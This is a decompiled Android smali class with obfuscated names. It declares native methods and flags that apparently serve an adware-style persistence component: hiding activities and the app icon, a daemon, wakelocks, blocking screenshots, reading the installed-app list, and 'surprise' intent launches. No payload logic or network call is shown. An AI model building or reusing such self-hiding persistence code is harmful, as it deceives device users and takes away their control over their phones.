.class public final Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;
.super Ljava/lang/Object;


# static fields
.field public static final INSTANCE:Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;

.field private static USE_BA_ACTIVITY:Z

.field private static USE_ShowWhenLocked:Z

.field private static USE_woxhyoq_ACTIVITY:Z

.field private static custom_notification:Landroid/app/Notification$Builder;

.field private static final fgImpl:Lmarmojkfnf/mnhosc/cswoel/wvfxxn/Mhufawcu;

.field private static fgListener:Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Qleybpju;

.field private static hideActivityWhiteListActivity:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private static hide_activity_task:Z

.field private static isInit:Z

.field private static isStop:Z

.field private static prohibitScreenshots:Z

.field private static use_account:Z

.field private static use_activity:Z

.field private static use_auto_reqNotificationPermissions:Z

.field private static use_auto_widget:Z

.field private static use_domaemon:Z

.field private static use_float_window:Z

.field private static use_music:Z

.field private static use_notification:Z

.field private static use_provider:Z

.field private static use_receiver:Z

.field private static use_safe_mode:Z

.field private static use_service:Z

.field private static use_thaw:Z

.field private static use_wakelock:Z


# direct methods
.method public static constructor <clinit>()V
    .locals 1

    const/16 v0, 0x2d

    invoke-static {v0}, Lfmfjq/twyvy/xjhbp;->classescxclcy(I)V

    new-instance v0, Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;

    invoke-direct {v0}, Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;-><init>()V

    sput-object v0, Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;->INSTANCE:Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;

    new-instance v0, Lmarmojkfnf/mnhosc/cswoel/wvfxxn/Mhufawcu;

    invoke-direct {v0}, Lmarmojkfnf/mnhosc/cswoel/wvfxxn/Mhufawcu;-><init>()V

    sput-object v0, Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;->fgImpl:Lmarmojkfnf/mnhosc/cswoel/wvfxxn/Mhufawcu;

    const/4 v0, 0x1

    sput-boolean v0, Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;->use_wakelock:Z

    sput-boolean v0, Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;->use_provider:Z

    sput-boolean v0, Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;->use_receiver:Z

    sput-boolean v0, Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;->use_account:Z

    sput-boolean v0, Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;->use_thaw:Z

    sput-boolean v0, Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;->use_safe_mode:Z

    sput-boolean v0, Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;->USE_ShowWhenLocked:Z

    sput-boolean v0, Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;->prohibitScreenshots:Z

    sput-boolean v0, Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;->USE_woxhyoq_ACTIVITY:Z

    return-void
.end method

.method private constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static synthetic hdic$default(Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;Landroid/content/Context;Ljava/lang/String;IILjava/lang/Object;)V
    .locals 0

    and-int/lit8 p4, p4, 0x4

    if-eqz p4, :cond_0

    const/4 p3, 0x2

    :cond_0
    invoke-virtual {p0, p1, p2, p3}, Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;->hdic(Landroid/content/Context;Ljava/lang/String;I)V

    return-void
.end method

.method public static synthetic isSF$default(Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;Landroid/content/Context;ZLjava/lang/String;[ILjava/lang/String;Ljava/lang/String;ILjava/lang/Object;)V
    .locals 7

    and-int/lit8 p8, p7, 0x10

    if-eqz p8, :cond_0

    const-string p5, "Q04="

    invoke-static {p5}, Lmarmojkfnf/dphnidckqxhm/i0;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p5

    :cond_0
    move-object v5, p5

    and-int/lit8 p5, p7, 0x20

    if-eqz p5, :cond_1

    const-string p5, "emg="

    invoke-static {p5}, Lmarmojkfnf/dphnidckqxhm/i0;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p6

    :cond_1
    move-object v6, p6

    move-object v0, p0

    move-object v1, p1

    move v2, p2

    move-object v3, p3

    move-object v4, p4

    invoke-virtual/range {v0 .. v6}, Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;->isSF(Landroid/content/Context;ZLjava/lang/String;[ILjava/lang/String;Ljava/lang/String;)V

    return-void
.end method

.method public static synthetic listenInstalledAppStartOrEnd$default(Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Qleybpju;IIILjava/lang/Object;)V
    .locals 1

    and-int/lit8 p5, p4, 0x2

    const/16 v0, 0x28

    if-eqz p5, :cond_0

    const/16 p2, 0x28

    :cond_0
    and-int/lit8 p4, p4, 0x4

    if-eqz p4, :cond_1

    const/16 p3, 0x28

    :cond_1
    invoke-virtual {p0, p1, p2, p3}, Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;->listenInstalledAppStartOrEnd(Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Qleybpju;II)V

    return-void
.end method

.method public static synthetic surprise$default(Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;Landroid/content/Context;Landroid/content/Intent;Ljava/lang/String;ZZLmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Jehtxjp;Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Hbkffen;ILjava/lang/Object;)V
    .locals 9

    and-int/lit8 v0, p8, 0x40

    if-eqz v0, :cond_0

    const/4 v0, 0x0

    move-object v8, v0

    goto :goto_0

    :cond_0
    move-object/from16 v8, p7

    :goto_0
    move-object v1, p0

    move-object v2, p1

    move-object v3, p2

    move-object v4, p3

    move v5, p4

    move v6, p5

    move-object v7, p6

    invoke-virtual/range {v1 .. v8}, Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;->surprise(Landroid/content/Context;Landroid/content/Intent;Ljava/lang/String;ZZLmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Jehtxjp;Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Hbkffen;)V

    return-void
.end method

.method public static synthetic surprise2$default(Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;Landroid/content/Context;Landroid/content/Intent;Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Hbkffen;ILjava/lang/Object;)V
    .locals 0

    and-int/lit8 p4, p4, 0x4

    if-eqz p4, :cond_0

    const/4 p3, 0x0

    :cond_0
    invoke-virtual {p0, p1, p2, p3}, Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;->surprise2(Landroid/content/Context;Landroid/content/Intent;Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Hbkffen;)V

    return-void
.end method


# virtual methods
.method public final native attach(Landroid/content/Context;)V
.end method

.method public final native batteryStrategy(Landroid/content/Context;)V
.end method

.method public final native getCustom_notification()Landroid/app/Notification$Builder;
.end method

.method public final native getFgListener()Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Qleybpju;
.end method

.method public final native getHideActivityWhiteListActivity()Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/util/ArrayList<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end method

.method public final native getHide_activity_task()Z
.end method

.method public final native getInstallAppList(Landroid/content/Context;)Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            ")",
            "Ljava/util/List<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end method

.method public final native getInstallRefer(Landroid/content/Context;Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Qoghcdrl;)V
.end method

.method public final native getProhibitScreenshots()Z
.end method

.method public final native getSettingIconName(Landroid/content/Context;)Ljava/lang/String;
.end method

.method public final native getUSE_BA_ACTIVITY()Z
.end method

.method public final native getUSE_ShowWhenLocked()Z
.end method

.method public final native getUSE_woxhyoq_ACTIVITY()Z
.end method

.method public final native getUse_account()Z
.end method

.method public final native getUse_activity()Z
.end method

.method public final native getUse_auto_reqNotificationPermissions()Z
.end method

.method public final native getUse_auto_widget()Z
.end method

.method public final native getUse_domaemon()Z
.end method

.method public final native getUse_float_window()Z
.end method

.method public final native getUse_music()Z
.end method

.method public final native getUse_notification()Z
.end method

.method public final native getUse_provider()Z
.end method

.method public final native getUse_receiver()Z
.end method

.method public final native getUse_safe_mode()Z
.end method

.method public final native getUse_service()Z
.end method

.method public final native getUse_thaw()Z
.end method

.method public final native getUse_wakelock()Z
.end method

.method public final native hasAWG(Landroid/content/Context;)Z
.end method

.method public final native hasBatteryStrategy(Landroid/content/Context;)Z
.end method

.method public final native hasPopWindowPermissions(Landroid/content/Context;)Z
.end method

.method public final native hasWallpaper(Landroid/content/Context;)Z
.end method

.method public final native hasWhitelistSettings(Landroid/content/Context;)Z
.end method

.method public final native hdic(Landroid/content/Context;)V
.end method

.method public final native hdic(Landroid/content/Context;Ljava/lang/String;I)V
.end method

.method public final native init(Landroid/content/Context;)V
.end method

.method public final native init(Landroid/content/Context;Z)V
.end method

.method public final native isAppInFront()Z
.end method

.method public final native isFgActivity(Ljava/lang/String;)Z
.end method

.method public final native isFgProcess(Landroid/content/Context;)Z
.end method

.method public final native isInit()Z
.end method

.method public final native isMainProcess(Landroid/content/Context;)Z
.end method

.method public final native isSF(Landroid/content/Context;ZLjava/lang/String;[ILjava/lang/String;Ljava/lang/String;)V
.end method

.method public final native isStop()Z
.end method

.method public final native ishdic(Landroid/content/Context;Ljava/lang/String;)Z
.end method

.method public final native listenInstalledAppStartOrEnd(Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Qleybpju;II)V
.end method

.method public final native regActionListener(Landroid/content/Context;Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Uqjqbxl;)V
.end method

.method public final native regActionReceiver(Landroid/content/Context;)V
.end method

.method public final native reqNotificationPermissionsIfNotEnabled(Landroid/content/Context;)V
.end method

.method public final native reqNotificationsPermission(Landroid/app/Activity;)V
.end method

.method public final native reqPopWindowPermissions(Landroid/content/Context;)V
.end method

.method public final native setCustom_notification(Landroid/app/Notification$Builder;)V
.end method

.method public final native setFGListener(Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Qleybpju;)V
.end method

.method public final native setFgListener(Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Qleybpju;)V
.end method

.method public final native setHideActivityWhiteListActivity(Ljava/util/ArrayList;)V
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/util/ArrayList<",
            "Ljava/lang/String;",
            ">;)V"
        }
    .end annotation
.end method

.method public final native setHide_activity_task(Z)V
.end method

.method public final native setInit(Z)V
.end method

.method public final native setIsHideActivityTaskWhenHome(ZLjava/util/ArrayList;)V
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(Z",
            "Ljava/util/ArrayList<",
            "Ljava/lang/String;",
            ">;)V"
        }
    .end annotation
.end method

.method public final native setOrUpdateToken(Landroid/content/Context;Ljava/lang/String;)V
.end method

.method public final native setProhibitScreenshots(Z)V
.end method

.method public final native setStop(Z)V
.end method

.method public final native setUSE_BA_ACTIVITY(Z)V
.end method

.method public final native setUSE_ShowWhenLocked(Z)V
.end method

.method public final native setUSE_woxhyoq_ACTIVITY(Z)V
.end method

.method public final native setUse_account(Z)V
.end method

.method public final native setUse_activity(Z)V
.end method

.method public final native setUse_auto_reqNotificationPermissions(Z)V
.end method

.method public final native setUse_auto_widget(Z)V
.end method

.method public final native setUse_domaemon(Z)V
.end method

.method public final native setUse_float_window(Z)V
.end method

.method public final native setUse_music(Z)V
.end method

.method public final native setUse_notification(Z)V
.end method

.method public final native setUse_provider(Z)V
.end method

.method public final native setUse_receiver(Z)V
.end method

.method public final native setUse_safe_mode(Z)V
.end method

.method public final native setUse_service(Z)V
.end method

.method public final native setUse_thaw(Z)V
.end method

.method public final native setUse_wakelock(Z)V
.end method

.method public final native setWallpaper(Landroid/content/Context;Landroid/graphics/Bitmap;Landroid/graphics/Bitmap;)V
.end method

.method public final native showIcon(Landroid/content/Context;Ljava/lang/String;)V
.end method

.method public final native showLauncher(Landroid/content/Context;Ljava/lang/String;)V
.end method

.method public final native showTips(Landroid/content/Context;Ljava/lang/String;)V
.end method

.method public final native startAWG(Landroid/content/Context;)V
.end method

.method public final native stop(Landroid/content/Context;)V
.end method

.method public final native stopMusic(Landroid/content/Context;)V
.end method

.method public final native surprise(Landroid/content/Context;Landroid/content/Intent;Ljava/lang/String;ZZLmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Jehtxjp;Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Hbkffen;)V
.end method

.method public final native surprise2(Landroid/content/Context;Landroid/content/Intent;Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Hbkffen;)V
.end method

.method public final native unRegActionListener(Landroid/content/Context;Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Uqjqbxl;)V
.end method

.method public final native unRegActionReceiver(Landroid/content/Context;)V
.end method

.method public final native whitelistSettings(Landroid/content/Context;)V
.end method
